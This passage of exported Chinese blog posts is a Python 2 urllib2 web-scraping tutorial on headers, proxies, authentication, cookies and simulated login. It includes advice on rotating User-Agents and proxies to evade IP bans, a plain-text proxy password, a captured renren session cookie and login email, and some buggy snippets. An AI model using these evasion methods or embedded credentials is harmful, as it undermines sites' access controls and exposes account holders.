id=\"useragent\">User-Agent</h2>\n\n<p>但是这样直接用urllib2给一个网站发送请求的话，确实略有些唐突了，就好比，人家每家都有门，你以一个路人的身份直接闯进去显然不是很礼貌。而且有一些站点不喜欢被程序（非人为访问）访问，有可能会拒绝你的访问请求。</p>\n\n<p>但是如果我们用一个合法的身份去请求别人网站，显然人家就是欢迎的，所以我们就应该给我们的这个代码加上一个身份，就是所谓的<code>User-Agent</code>头。</p>\n\n<blockquote>\n<ul><li>浏览器 就是互联网世界上公认被允许的身份，如果我们希望我们的爬虫程序更像一个真实用户，那我们第一步，就是需要伪装成一个被公认的浏览器。用不同的浏览器在发送请求的时候，会有不同的User-Agent头。 urllib2默认的User-Agent头为：<code>Python-urllib/x.y</code>（x和y是Python主版本和次版本号,例如 Python-urllib/2.7）</li>\n</ul></blockquote>\n\n<pre class=\"has\">\n<code>#urllib2_useragent.py\n\nimport urllib2\n\nurl = \"http://www.itcast.cn\"\n\n#IE 9.0 的 User-Agent，包含在 ua_header里\nua_header = {\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"} \n\n#  url 连同 headers，一起构造Request请求，这个请求将附带 IE9.0 浏览器的User-Agent\nrequest = urllib2.Request(url, headers = ua_header)\n\n# 向服务器发送这个请求\nresponse = urllib2.urlopen(request)\n\nhtml = response.read()\nprint html\n</code></pre>\n\n<h2 id=\"添加更多的header信息\">添加更多的Header信息</h2>\n\n<p>在 HTTP Request 中加入特定的 Header，来构造一个完整的HTTP请求消息。</p>\n\n<blockquote>\n<p>可以通过调用<code>Request.add_header()</code> 添加/修改一个特定的header 也可以通过调用<code>Request.get_header()</code>来查看已有的header。</p>\n</blockquote>\n\n<ul><li>添加一个特定的header</li>\n</ul><pre class=\"has\">\n<code># urllib2_headers.py\n\nimport urllib2\n\nurl = \"http://www.itcast.cn\"\n\n#IE 9.0 的 User-Agent\nheader = {\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"} \nrequest = urllib2.Request(url, headers = header)\n\n#也可以通过调用Request.add_header() 添加/修改一个特定的header\nrequest.add_header(\"Connection\", \"keep-alive\")\n\n# 也可以通过调用Request.get_header()来查看header信息\n# request.get_header(header_name=\"Connection\")\n\nresponse = urllib2.urlopen(req)\n\nprint response.code     #可以查看响应状态码\nhtml = response.read()\n\nprint html\n</code></pre>\n\n<ul><li>随机添加/修改User-Agent</li>\n</ul><pre class=\"has\">\n<code># urllib2_add_headers.py\n\nimport urllib2\nimport random\n\nurl = \"http://www.itcast.cn\"\n\nua_list = [\n    \"Mozilla/5.0 (Windows NT 6.1; ) Apple.... \",\n    \"Mozilla/5.0 (X11; CrOS i686 2268.111.0)... \",\n    \"Mozilla/5.0 (Macintosh; U; PPC Mac OS X.... \",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS... \"\n]\n\nuser_agent = random.choice(ua_list)\n\nrequest = urllib2.Request(url)\n\n#也可以通过调用Request.add_header() 添加/修改一个特定的header\nrequest.add_header(\"User-Agent\", user_agent)\n\n# 第一个字母大写，后面的全部小写\nrequest.get_header(\"User-agent\")\n\nresponse = urllib2.urlopen(req)\n\nhtml = response.read()\nprint html</code></pre>\n                                    </div>", "log_PostTime": 1584891186, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：urllib2模块GET和POST请求", "log_Intro": "Python：urllib2模块GET和POST请求", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"urllib2默认只支持httphttps的get和post方法\"><strong>urllib2默认只支持HTTP/HTTPS的<code>GET</code>和<code>POST</code>方法</strong></h2>\n\n<h3 id=\"urlliburlencode\">urllib.urlencode()</h3>\n\n<p>urllib 和 urllib2 都是接受URL请求的相关模块，但是提供了不同的功能。两个最显著的不同如下：</p>\n\n<blockquote>\n<ul><li>\n\t<p>urllib 仅可以接受URL，不能创建 设置了headers 的Request 类实例；</p>\n\t</li>\n\t<li>\n\t<p>但是 urllib 提供 <code>urlencode</code> 方法用来GET查询字符串的产生，而 urllib2 则没有。（这是 urllib 和 urllib2 经常一起使用的主要原因）</p>\n\t</li>\n\t<li>\n\t<p>编码工作使用urllib的<code>urlencode()</code>函数，帮我们将<code>key:value</code>这样的键值对转换成<code>\"key=value\"</code>这样的字符串，解码工作可以使用urllib的<code>unquote()</code>函数。（注意，不是urllib2.urlencode() )</p>\n\t</li>\n</ul></blockquote>\n\n<pre class=\"has\">\n<code># IPython2 中的测试结果\nIn [1]: import urllib\n\nIn [2]: word = {\"wd\" : \"传智播客\"}\n\n# 通过urllib.urlencode()方法，将字典键值对按URL编码转换，从而能被web服务器接受。\nIn [3]: urllib.urlencode(word)  \nOut[3]: \"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\"\n\n# 通过urllib.unquote()方法，把 URL编码字符串，转换回原先字符串。\nIn [4]: print urllib.unquote(\"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%</code></pre>                                    </div>", "log_PostTime": 1584891188, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:urllib2模块Handler处理器 和 自定义Opener", "log_Intro": "Python:urllib2模块Handler处理器 和 自定义Opener", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"handler处理器-和-自定义opener\">Handler处理器 和 自定义Opener</h1>\n\n<ul><li>\n\t<p>opener是 urllib2.OpenerDirector 的实例，我们之前一直都在使用的urlopen，它是一个特殊的opener（也就是模块帮我们构建好的）。</p>\n\t</li>\n\t<li>\n\t<p>但是基本的urlopen()方法不支持代理、cookie等其他的HTTP/HTTPS高级功能。所以要支持这些功能：</p>\n\n\t<ol><li>使用相关的 <code>Handler处理器</code> 来创建特定功能的处理器对象；</li>\n\t\t<li>然后通过 <code>urllib2.build_opener()</code>方法使用这些处理器对象，创建自定义opener对象；</li>\n\t\t<li>使用自定义的opener对象，调用<code>open()</code>方法发送请求。</li>\n\t</ol></li>\n\t<li>\n\t<p>如果程序里所有的请求都使用自定义的opener，可以使用<code>urllib2.install_opener()</code> 将自定义的 opener 对象 定义为 全局opener，表示如果之后凡是调用urlopen，都将使用这个opener（根据自己的需求来选择）</p>\n\t</li>\n</ul><h2 id=\"简单的自定义opener\">简单的自定义opener()</h2>\n\n<pre class=\"has\">\n<code>import urllib2\n\n# 构建一个HTTPHandler 处理器对象，支持处理HTTP请求\nhttp_handler = urllib2.HTTPHandler()\n\n# 构建一个HTTPHandler 处理器对象，支持处理HTTPS请求\n# http_handler = urllib2.HTTPSHandler()\n\n# 调用urllib2.build_opener()方法，创建支持处理HTTP请求的opener对象\nopener = urllib2.build_opener(http_handler)\n\n# 构建 Request请求\nrequest = urllib2.Request(\"http://www.baidu.com/\")\n\n# 调用自定义opener对象的open()方法，发送request请求\nresponse = opener.open(request)\n\n# 获取服务器响应内容\nprint response.read()\n</code></pre>\n\n<p>这种方式发送请求得到的结果，和使用<code>urllib2.urlopen()</code>发送HTTP/HTTPS请求得到的结果是一样的。</p>\n\n<p>如果在 HTTPHandler()增加 <code>debuglevel=1</code>参数，还会将 Debug Log 打开，这样程序在执行的时候，会把收包和发包的报头在屏幕上自动打印出来，方便调试，有时可以省去抓包的工作。</p>\n\n<pre class=\"has\">\n<code># 仅需要修改的代码部分：\n\n# 构建一个HTTPHandler 处理器对象，支持处理HTTP请求，同时开启Debug Log，debuglevel 值默认 0\nhttp_handler = urllib2.HTTPHandler(debuglevel=1)\n\n# 构建一个HTTPHSandler 处理器对象，支持处理HTTPS请求，同时开启Debug Log，debuglevel 值默认 0\nhttps_handler = urllib2.HTTPSHandler(debuglevel=1)\n</code></pre>\n\n<h2 id=\"proxyhandler处理器（代理设置）\">ProxyHandler处理器（代理设置）</h2>\n\n<p>使用代理IP，这是爬虫/反爬虫的第二大招，通常也是最好用的。</p>\n\n<p>很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP的访问。</p>\n\n<p>所以我们可以设置一些代理服务器，每隔一段时间换一个代理，就算IP被禁止，依然可以换个IP继续爬取。</p>\n\n<p>urllib2中通过ProxyHandler来设置使用代理服务器，下面代码说明如何使用自定义opener来使用代理：</p>\n\n<pre class=\"has\">\n<code>#urllib2_proxy1.py\n\nimport urllib2\n\n# 构建了两个代理Handler，一个有代理IP，一个没有代理IP\nhttpproxy_handler = urllib2.ProxyHandler({\"http\" : \"124.88.67.81:80\"})\nnullproxy_handler = urllib2.ProxyHandler({})\n\nproxySwitch = True #定义一个代理开关\n\n# 通过 urllib2.build_opener()方法使用这些代理Handler对象，创建自定义opener对象\n# 根据代理开关是否打开，使用不同的代理模式\nif proxySwitch:  \n    opener = urllib2.build_opener(httpproxy_handler)\nelse:\n    opener = urllib2.build_opener(nullproxy_handler)\n\nrequest = urllib2.Request(\"http://www.baidu.com/\")\n\n# 1. 如果这么写，只有使用opener.open()方法发送请求才使用自定义的代理，而urlopen()则不使用自定义代理。\nresponse = opener.open(request)\n\n# 2. 如果这么写，就是将opener应用到全局，之后所有的，不管是opener.open()还是urlopen() 发送请求，都将使用自定义代理。\n# urllib2.install_opener(opener)\n# response = urlopen(request)\n\nprint response.read()\n</code></pre>\n\n<p>免费的开放代理获取基本没有成本，我们可以在一些代理网站上收集这些免费代理，测试后如果可以用，就把它收集起来用在爬虫上面。</p>\n\n<p>免费短期代理网站举例：</p>\n\n<ul><li><a href=\"http://www.xicidaili.com/\" rel=\"nofollow\">西刺免费代理IP</a></li>\n\t<li><a href=\"http://www.kuaidaili.com/free/inha/\" rel=\"nofollow\">快代理免费代理</a></li>\n\t<li><a href=\"http://www.proxy360.cn/default.aspx\" rel=\"nofollow\">Proxy360代理</a></li>\n\t<li><a href=\"http://www.goubanjia.com/free/index.shtml\" rel=\"nofollow\">全网代理IP</a></li>\n</ul><p>如果代理IP足够多，就可以像随机获取User-Agent一样，随机选择一个代理去访问网站。</p>\n\n<pre class=\"has\">\n<code>import urllib2\nimport random\n\nproxy_list = [\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"}\n]\n\n# 随机选择一个代理\nproxy = random.choice(proxy_list)\n# 使用选择的代理构建代理处理器对象\nhttpproxy_handler = urllib2.ProxyHandler(proxy)\n\nopener = urllib2.build_opener(httpproxy_handler)\n\nrequest = urllib2.Request(\"http://www.baidu.com/\")\nresponse = opener.open(request)\nprint response.read()\n</code></pre>\n\n<blockquote>\n<p>但是，这些免费开放代理一般会有很多人都在使用，而且代理有寿命短，速度慢，匿名度不高，HTTP/HTTPS支持不稳定等缺点（免费没好货）。</p>\n\n<p>所以，专业爬虫工程师或爬虫公司会使用高品质的私密代理，这些代理通常需要找专门的代理供应商购买，再通过用户名/密码授权使用（舍不得孩子套不到狼）。</p>\n</blockquote>\n\n<h2 id=\"httppasswordmgrwithdefaultrealm\">HTTPPasswordMgrWithDefaultRealm()</h2>\n\n<p><code>HTTPPasswordMgrWithDefaultRealm()</code>类将创建一个密码管理对象，用来保存 HTTP 请求相关的用户名和密码，主要应用两个场景：</p>\n\n<ol><li>验证代理授权的用户名和密码 (<code>ProxyBasicAuthHandler()</code>)</li>\n\t<li>验证Web客户端的的用户名和密码 (<code>HTTPBasicAuthHandler()</code>)</li>\n</ol><h3 id=\"proxybasicauthhandler代理授权验证\">ProxyBasicAuthHandler(代理授权验证)</h3>\n\n<p>如果我们使用之前的代码来使用私密代理，会报 HTTP 407 错误，表示代理没有通过身份验证：</p>\n\n<p><code>urllib2.HTTPError: HTTP Error 407: Proxy Authentication Required</code></p>\n\n<p>所以我们需要改写代码，通过：</p>\n\n<ul><li><code>HTTPPasswordMgrWithDefaultRealm()</code>：来保存私密代理的用户密码</li>\n\t<li><code>ProxyBasicAuthHandler()</code>：来处理代理的身份验证。</li>\n</ul><pre class=\"has\">\n<code>#urllib2_proxy2.py\n\nimport urllib2\nimport urllib\n\n# 私密代理授权的账户\nuser = \"mr_mao_hacker\"\n# 私密代理授权的密码\npasswd = \"sffqry9r\"\n# 私密代理 IP\nproxyserver = \"61.158.163.130:16816\"\n\n# 1. 构建一个密码管理对象，用来保存需要处理的用户名和密码\npasswdmgr = urllib2.HTTPPasswordMgrWithDefaultRealm()\n\n# 2. 添加账户信息，第一个参数realm是与远程服务器相关的域信息，一般没人管它都是写None，后面三个参数分别是 代理服务器、用户名、密码\npasswdmgr.add_password(None, proxyserver, user, passwd)\n\n# 3. 构建一个代理基础用户名/密码验证的ProxyBasicAuthHandler处理器对象，参数是创建的密码管理对象\n#   注意，这里不再使用普通ProxyHandler类了\nproxyauth_handler = urllib2.ProxyBasicAuthHandler(passwdmgr)\n\n# 4. 通过 build_opener()方法使用这些代理Handler对象，创建自定义opener对象，参数包括构建的 proxy_handler 和 proxyauth_handler\nopener = urllib2.build_opener(proxyauth_handler)\n\n# 5. 构造Request 请求\nrequest = urllib2.Request(\"http://www.baidu.com/\")\n\n# 6. 使用自定义opener发送请求\nresponse = opener.open(request)\n\n# 7. 打印响应内容\nprint response.read()\n</code></pre>\n\n<h3 id=\"httpbasicauthhandler处理器（web客户端授权验证）\">HTTPBasicAuthHandler处理器（Web客户端授权验证）</h3>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019102317583391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>有些Web服务器（包括HTTP/FTP等）访问时，需要进行用户身份验证，爬虫直接访问会报HTTP 401 错误，表示访问身份未经授权：</p>\n\n<p><code>urllib2.HTTPError: HTTP Error 401: Unauthorized</code></p>\n\n<p>如果我们有客户端的用户名和密码，我们可以通过下面的方法去访问爬取：</p>\n\n<pre class=\"has\">\n<code>import urllib\nimport urllib2\n\n# 用户名\nuser = \"test\"\n# 密码\npasswd = \"123456\"\n# Web服务器 IP\nwebserver = \"http://192.168.199.107\"\n\n# 1. 构建一个密码管理对象，用来保存需要处理的用户名和密码\npasswdmgr = urllib2.HTTPPasswordMgrWithDefaultRealm()\n\n# 2. 添加账户信息，第一个参数realm是与远程服务器相关的域信息，一般没人管它都是写None，后面三个参数分别是 Web服务器、用户名、密码\npasswdmgr.add_password(None, webserver, user, passwd)\n\n# 3. 构建一个HTTP基础用户名/密码验证的HTTPBasicAuthHandler处理器对象，参数是创建的密码管理对象\nhttpauth_handler = urllib2.HTTPBasicAuthHandler(passwdmgr)\n\n# 4. 通过 build_opener()方法使用这些代理Handler对象，创建自定义opener对象，参数包括构建的 proxy_handler\nopener = urllib2.build_opener(httpauth_handler)\n\n# 5. 可以选择通过install_opener()方法定义opener为全局opener\nurllib2.install_opener(opener)\n\n# 6. 构建 Request对象\nrequest = urllib2.Request(\"http://192.168.199.107\")\n\n# 7. 定义opener为全局opener后，可直接使用urlopen()发送请求\nresponse = urllib2.urlopen(request)\n\n# 8. 打印响应内容\nprint response.read()\n</code></pre>\n\n<h2 id=\"cookie\">Cookie</h2>\n\n<p>Cookie 是指某些网站服务器为了辨别用户身份和进行Session跟踪，而储存在用户浏览器上的文本文件，Cookie可以保持登录信息到用户下次与服务器的会话。</p>\n\n<h3 id=\"cookie原理\">Cookie原理</h3>\n\n<p>HTTP是无状态的面向连接的协议, 为了保持连接状态, 引入了Cookie机制 Cookie是http消息头中的一种属性，包括：</p>\n\n<pre class=\"has\">\n<code>Cookie名字（Name）\nCookie的值（Value）\nCookie的过期时间（Expires/Max-Age）\nCookie作用路径（Path）\nCookie所在域名（Domain），\n使用Cookie进行安全连接（Secure）。\n\n前两个参数是Cookie应用的必要条件，另外，还包括Cookie大小（Size，不同浏览器对Cookie个数及大小限制是有差异的）。\n</code></pre>\n\n<p>Cookie由变量名和值组成，根据 Netscape公司的规定，Cookie格式如下：</p>\n\n<p><code>Set－Cookie: NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME；SECURE</code></p>\n\n<h3 id=\"cookie应用\">Cookie应用</h3>\n\n<p>Cookies在爬虫方面最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续。</p>\n\n<pre class=\"has\">\n<code># 获取一个有登录信息的Cookie模拟登陆\n\nimport urllib2\n\n# 1. 构建一个已经登录过的用户的headers信息\nheaders = {\n    \"Host\":\"www.renren.com\",\n    \"Connection\":\"keep-alive\",\n    \"Upgrade-Insecure-Requests\":\"1\",\n    \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\",\n    \"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n    \"Accept-Language\":\"zh-CN,zh;q=0.8,en;q=0.6\",\n\n    # 便于终端阅读，表示不支持压缩文件\n    # Accept-Encoding: gzip, deflate, sdch,\n\n    # 重点：这个Cookie是保存了密码无需重复登录的用户的Cookie，这个Cookie里记录了用户名，密码(通常经过RAS加密)\n    \"Cookie\": \"anonymid=ixrna3fysufnwv; depovince=GW; _r01_=1; JSESSIONID=abcmaDhEdqIlM7riy5iMv; jebe_key=f6fb270b-d06d-42e6-8b53-e67c3156aa7e%7Cc13c37f53bca9e1e7132d4b58ce00fa3%7C1484060607478%7C1%7C1484060607173; jebecookies=26fb58d1-cbe7-4fc3-a4ad-592233d1b42e|||||; ick_login=1f2b895d-34c7-4a1d-afb7-d84666fad409; _de=BF09EE3A28DED52E6B65F6A4705D973F1383380866D39FF5; p=99e54330ba9f910b02e6b08058f780479; ap=327550029; first_login_flag=1; ln_uact=mr_mao_hacker@163.com; ln_hurl=http://hdn.xnimg.cn/photos/hdn521/20140529/1055/h_main_9A3Z_e0c300019f6a195a.jpg; t=214ca9a28f70ca6aa0801404dda4f6789; societyguester=214ca9a28f70ca6aa0801404dda4f6789; id=327550029; xnsid=745033c5; ver=7.0; loginfrom=syshome\"\n}\n\n# 2. 通过headers里的报头信息（主要是Cookie信息），构建Request对象\nurllib2.Request(\"http://www.renren.com/\", headers = headers)\n\n# 3. 直接访问renren主页，服务器会根据headers报头信息（主要是Cookie信息），判断这是一个已经登录的用户，并返回相应的页面\nresponse = urllib2.urlopen(request)\n\n# 4. 打印响应内容\nprint response.read()\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023175907785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>但是这样做太过复杂，我们先需要在浏览器登录账户，并且设置保存密码，并且通过抓包才能获取这个Cookie，那有么有更简单方便的方法呢？</p>\n\n<h2 id=\"cookielib库-和-httpcookieprocessor处理器\">cookielib库 和 HTTPCookieProcessor处理器</h2>\n\n<p>在Python处理Cookie，一般是通过<code>cookielib</code>模块和 urllib2模块的<code>HTTPCookieProcessor</code>处理器类一起使用。</p>\n\n<blockquote>\n<p><code>cookielib</code>模块：主要作用是提供用于存储cookie的对象</p>\n\n<p><code>HTTPCookieProcessor</code>处理器：主要作用是处理这些cookie对象，并构建handler对象。</p>\n</blockquote>\n\n<h3 id=\"cookielib-库\">cookielib 库</h3>\n\n<p>该模块主要的对象有CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。</p>\n\n<blockquote>\n<ul><li>\n\t<p>CookieJar：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。</p>\n\t</li>\n\t<li>\n\t<p>FileCookieJar (filename,delayload=None,policy=None)：从CookieJar派生而来，用来创建FileCookieJar实例，检索cookie信息并将cookie存储到文件中。filename是存储cookie的文件名。delayload为True时支持延迟访问访问文件，即只有在需要时才读取文件或在文件中存储数据。</p>\n\t</li>\n\t<li>\n\t<p>MozillaCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与<code>Mozilla浏览器 cookies.txt兼容</code>的FileCookieJar实例。</p>\n\t</li>\n\t<li>\n\t<p>LWPCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与<code>libwww-perl标准的 Set-Cookie3 文件格式</code>兼容的FileCookieJar实例。</p>\n\t</li>\n</ul></blockquote>\n\n<p><strong><em>其实大多数情况下，我们只用CookieJar()，如果需要和本地文件交互，就用 MozillaCookjar() 或 LWPCookieJar()</em></strong></p>\n\n<p>我们来做几个案例：</p>\n\n<p>1）获取Cookie，并保存到CookieJar()对象中</p>\n\n<pre class=\"has\">\n<code># urllib2_cookielibtest1.py\n\nimport urllib2\nimport cookielib\n\n# 构建一个CookieJar对象实例来保存cookie\ncookiejar = cookielib.CookieJar()\n\n# 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\nhandler=urllib2.HTTPCookieProcessor(cookiejar)\n\n# 通过 build_opener() 来构建opener\nopener = urllib2.build_opener(handler)\n\n# 4. 以get方法访问页面，访问之后会自动保存cookie到cookiejar中\nopener.open(\"http://www.baidu.com\")\n\n## 可以按标准格式将保存的Cookie打印出来\ncookieStr = \"\"\nfor item in cookiejar:\n    cookieStr = cookieStr + item.name + \"=\" + item.value + \";\"\n\n## 舍去最后一位的分号\nprint cookieStr[:-1]\n</code></pre>\n\n<p>我们使用以上方法将Cookie保存到cookiejar对象中，然后打印出了cookie中的值，也就是访问百度首页的Cookie值。</p>\n\n<p>运行结果如下：</p>\n\n<pre class=\"has\">\n<code>BAIDUID=4327A58E63A92B73FF7A297FB3B2B4D0:FG=1;BIDUPSID=4327A58E63A92B73FF7A297FB3B2B4D0;H_PS_PSSID=1429_21115_17001_21454_21409_21554_21398;PSTM=1480815736;BDSVRTM=0;BD_HOME=0\n</code></pre>\n\n<p>2. 访问网站获得cookie，并把获得的cookie保存在cookie文件中</p>\n\n<pre class=\"has\">\n<code># urllib2_cookielibtest2.py\n\nimport cookielib\nimport urllib2\n\n# 保存cookie的本地磁盘文件名\nfilename = 'cookie.txt'\n\n# 声明一个MozillaCookieJar(有save实现)对象实例来保存cookie，之后写入文件\ncookiejar = cookielib.MozillaCookieJar(filename)\n\n# 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\nhandler = urllib2.HTTPCookieProcessor(cookiejar)\n\n# 通过 build_opener() 来构建opener\nopener = urllib2.build_opener(handler)\n\n# 创建一个请求，原理同urllib2的urlopen\nresponse = opener.open(\"http://www.baidu.com\")\n\n# 保存cookie到本地文件\ncookiejar.save()\n</code></pre>\n\n<p>3. 从文件中获取cookies，做为请求的一部分去访问</p>\n\n<pre class=\"has\">\n<code># urllib2_cookielibtest2.py\n\nimport cookielib\nimport urllib2\n\n# 创建MozillaCookieJar(有load实现)实例对象\ncookiejar = cookielib.MozillaCookieJar()\n\n# 从文件中读取cookie内容到变量\ncookie.load('cookie.txt')\n\n# 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\nhandler = urllib2.HTTPCookieProcessor(cookiejar)\n\n# 通过 build_opener() 来构建opener\nopener = urllib2.build_opener(handler)\n\nresponse = opener.open(\"http://www.baidu.com\")\n</code></pre>\n\n<p>利用cookielib和post登录人人网</p>\n\n<pre class=\"has\">\n<code>import urllib\nimport urllib2\nimport cookielib\n\n# 1. 构建一个CookieJar对象实例来保存cookie\ncookie = cookielib.CookieJar()\n\n# 2. 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\ncookie_handler = urllib2.HTTPCookieProcessor(cookie)\n\n# 3. 通过 build_opener() 来构建opener\nopener = urllib2.build_opener(cookie_handler)\n\n# 4. addheaders 接受一个列表，里面每个元素都是一个headers信息的元祖, opener将附带headers信息\nopener.addheaders = [(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\")]\n\n# 5. 需要登录的账户和密码\ndata = {\"email\":\"mr_mao_hacker@163.com\", \"password\":\"alaxxxxxime\"}  \n\n# 6. 通过urlencode()转码\npostdata = urllib.urlencode(data)\n\n# 7. 构建Request请求对象，包含需要发送的用户名和密码\nrequest = urllib2.Request(\"http://www.renren.com/PLogin.do\", data = postdata)\n\n# 8. 通过opener发送这个请求，并获取登录后的Cookie值，\nopener.open(request)                                              \n\n# 9. opener包含用户登录后的Cookie值，可以直接访问那些登录后才可以访问的页面\nresponse = opener.open(\"http://www.renren.com/410043129/profile\")  \n\n# 10. 打印响应内容\nprint response.read()\n</code></pre>\n\n<p>模拟登录要注意几点：</p>\n\n<blockquote>\n<ol><li>登录一般都会先有一个HTTP GET，用于拉取一些信息及获得Cookie，然后再HTTP POST登录。</li>\n\t<li>HTTP POST登录的链接有可能是动态的，从GET返回的信息中获取。</li>\n\t<li>password 有些是明文发送，有些是加密后发送。有些网站甚至采用动态加密的，同时包括了很多其他数据的加密信息，只能通过查看JS源码获得加密算法，再去破解加密，非常困难。</li>\n\t<li>大多数网站的登录整体流程是类似的，可能有些细节不一样，所以不能保证其他网站登录成功。</li>\n</ol></blockquote>\n\n<p>这个测试案例中，为了想让大家快速理解知识点，我们使用的人人网登录接口是人人网改版前的隐藏接口(嘘....)，登录比较方便。</p>\n\n<p>当然，我们也可以直接发送账号密码到登录界面模拟登录，但是当网页采用JavaScript动态技术以后，想封锁基于 HttpClient 的模拟登录就太容易了，甚至可以根据你的鼠标活动的特征准确地判断出是不是真人在操作。</p>\n\n<p>所以，想做通用的模拟登录还得选别的技术，比如用内置浏览器引擎的爬虫(关键词：Selenium ，PhantomJS)，这个我们将在以后会学习到。</p>\n                                    </div>", "log_PostTime": 1584891189, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：urllib2模块的URLError与HTTPError", "log_Intro": "Python：urllib2模块的URLError与HTTPError", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"urllib2-的异常错误处理\">urllib2 的异常错误处理</h1>\n\n<p>在我们用<code>urlopen或opener.open</code>方法发出一个请求时，如果<code>urlopen或opener.open</code>不能处理这个response，就产生错误。</p>\n\n<p>这里主要说的是URLError和HTTPError，以及对它们的错误处理。</p>\n\n<h2 id=\"urlerror\">URLError</h2>\n\n<p>URLError 产生的原因主要有：</p>\n\n<blockquote>\n<ol><li>没有网络连接</li>\n\t<li>服务器连接失败</li>\n\t<li>找不到指定的服务器</li>\n</ol></blockquote>\n\n<p>我们可以用<code>try except</code>语句来捕获相应的异常。下面的例子里我们访问了一个不存在的域名：</p>\n\n<pre class=\"has\">\n<code># urllib2_urlerror.py\n\nimport urllib2\n\nrequset = urllib2.Request('http://www.ajkfhafwjqh.com')\n\ntry:\n    urllib2.urlopen(request, timeout=5)\nexcept urllib2.URLError, err:\n    print err\n</code></pre>\n\n<p>运行结果如下：</p>\n\n<pre class=\"has\">\n<code>&lt;urlopen error [Errno 8] nodename nor servname provided, or not known&gt;\n</code></pre>\n\n<blockquote>\n<p>urlopen error，错误代码8，错误原因是没有找到指定的服务器。</p>\n</blockquote>\n\n<h2 id=\"httperror\">HTTPError</h2>\n\n<p>HTTPError是URLError的子类，我们发出一个请求时，服务器上都会对应一个response应答对象，其中它包含一个数字\"响应状态码\"。</p>\n\n<p>如果<code>urlopen或opener.open</code>不能处理的，会产生一个HTTPError，对应相应的状态码，HTTP状态码表示HTTP协议所返回的响应的状态。</p>\n\n<p><strong>注意，urllib2可以为我们处理重定向的页面（也就是3开头的响应码），100-299范围的号码表示成功，所以我们只能看到400-599的错误号码。</strong></p>\n\n<pre class=\"has\">\n<code># urllib2_httperror.py\n\nimport urllib2\n\nrequset = urllib2.Request('http://blog.baidu.com/itcast')\n\ntry:\n    urllib2.urlopen(requset)\nexcept urllib2.HTTPError, err:\n    print err.code\n    print err\n</code></pre>\n\n<p>运行结果如下：</p>\n\n<pre class=\"has\">\n<code>404\nHTTP Error 404: Not Found\n</code></pre>\n\n<blockquote>\n<p>HTTP Error，错误代号是404，错误原因是Not Found，说明服务器无法找到被请求的页面。</p>\n\n<p>通常产生这种错误的，要么url不对，要么ip被封。</p>\n</blockquote>\n\n<h2 id=\"改进版\">改进版</h2>\n\n<p>由于HTTPError的父类是URLError，所以父类的异常应当写到子类异常的后面，所以上述的代码可以这么改写：</p>\n\n<pre class=\"has\">\n<code># urllib2_botherror.py\n\nimport urllib2\n\nrequset = urllib2.Request('http://blog.baidu.com/itcast')\n\ntry:\n    urllib2.urlopen(requset)\n\nexcept urllib2.HTTPError, err:\n    print err.code\n\nexcept urllib2.URLError, err:\n    print err\n\nelse:\n    print \"Good Job\"\n</code></pre>\n\n<p>运行结果如下：</p>\n\n<pre class=\"has\">\n<code>404\n</code></pre>\n\n<p>这样我们就可以做到，首先捕获子类的异常，如果子类捕获不到，那么可以捕获父类的异常。</p>\n\n<h1 id=\"http响应状态码参考：\">HTTP响应状态码参考：</h1>\n\n<pre class=\"has\">\n<code>1xx:信息\n\n100 Continue\n服务器仅接收到部分请求，但是一旦服务器并没有拒绝该请求，客户端应该继续发送其余的请求。\n101 Switching Protocols\n服务器转换协议：服务器将遵从客户的请求转换到另外一种协议。\n\n\n\n2xx:成功\n\n200 OK\n请求成功（其后是对GET和POST请求的应答文档）\n201 